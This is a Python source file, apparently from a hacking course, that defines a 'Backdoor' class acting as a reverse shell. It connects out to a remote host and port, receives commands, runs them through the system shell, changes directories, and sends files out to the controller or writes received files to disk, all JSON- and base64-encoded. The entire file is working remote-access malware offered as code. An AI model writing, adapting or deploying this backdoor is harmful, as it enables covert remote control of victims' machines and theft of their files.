#!/usr/bin/env python

import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        # json_data = json.dumps(data.decode("iso-8859-1"))
        json_data = json.dumps(data)
        # self.connection.send(json_data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        # json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
        
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def change_working_directory_tool(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file: # We open a file to be read as binary
            return base64.b64encode(file.read()) # To avoid unicode errors we use base64 encoding that translates to characters that json and python can parse

    def write_file(self, path, content):
        with open(path, "wb") as file: # To read a file as binary
            file.write(base64.b64decode(content)) # To avoid unicode errors we use base64 encoding that translates to characters that json and python can parse
            return "[+] Upload succesful."

    def run(self):
        while True:
            command = self.reliable_receive()
            
            #try:
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory_tool(command[1])
            elif command[0] == "download":
                # command_result = self.read_file(command[1])
                command_result = self.read_file(command[1]).decode()
            elif command[0] == "upload":
                command_result = self.write_file(command[1], command[2])
            else:
                # command = self.connection.recv(1024)
                # command_result = self.execute_system_command(command) # It can take either a string or a list of strings as input command
                try:
                    command_result = self.execute_system_command(command).decode()
                except UnicodeDecodeError:
                    command_result = self.execute_system_command(command).decode("iso-8859-1")
            #except Exception:
                #command_result = "[-] Error during command execution."

            # self.connection.send(command_result)
            self.reliable_send(command_result)
